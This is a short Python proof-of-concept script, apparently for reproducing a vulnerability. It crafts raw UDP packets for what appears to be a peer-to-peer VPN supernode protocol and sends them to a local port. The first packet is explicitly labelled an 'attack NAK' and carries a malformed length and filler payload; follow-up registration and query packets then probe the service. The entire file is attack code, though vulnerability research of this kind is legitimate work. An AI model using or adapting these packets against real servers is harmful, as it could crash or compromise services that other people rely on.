#!/usr/bin/env python3
"""Throwaway W2 probe: one attack NAK, then follow-up datagrams only."""
import socket
import struct
import sys
import time

port = int(sys.argv[1])
community = b"mynetwork".ljust(20, b"\0")
mac = bytes([2, 0, 0, 0, 0, 1])


def common(msg_type):
    return bytes([3, 3]) + struct.pack("!H", msg_type) + community


def send(pkt, label):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(pkt, ("127.0.0.1", port))
    sock.close()
    print(f"{time.strftime('%H:%M:%S')} sent {label} len={len(pkt)}", flush=True)


attack_nak = (common(8) + struct.pack("!I", 0x11223344) + mac
              + struct.pack("!HH", 0, 96) + bytes([0x48, 0x5a, 0x4d, 0x49]) * 24)
query_peer = common(11) + mac + bytes([2, 0, 0, 0, 0, 2]) + struct.pack("!H", 0)
register_super = (common(5) + struct.pack("!I", 0x11223344) + mac
                  + struct.pack("!I", 0) + bytes([0]) + bytes(16)
                  + struct.pack("!HH", 0, 0) + struct.pack("!I", 0))
register_ack = (common(7) + struct.pack("!I", 0x11223344) + mac
                + struct.pack("!I", 0) + bytes([0]) + struct.pack("!H", 0)
                + struct.pack("!HH", 0, port) + bytes([127, 0, 0, 1])
                + struct.pack("!HH", 0, 0) + bytes([0])
                + struct.pack("!I", 0))

send(attack_nak, "attack NAK")
time.sleep(1.0)
send(query_peer, "QUERY_PEER")
time.sleep(1.0)
send(register_super, "REGISTER_SUPER")
time.sleep(1.0)
send(register_ack, "REGISTER_SUPER_ACK")
time.sleep(5.0)
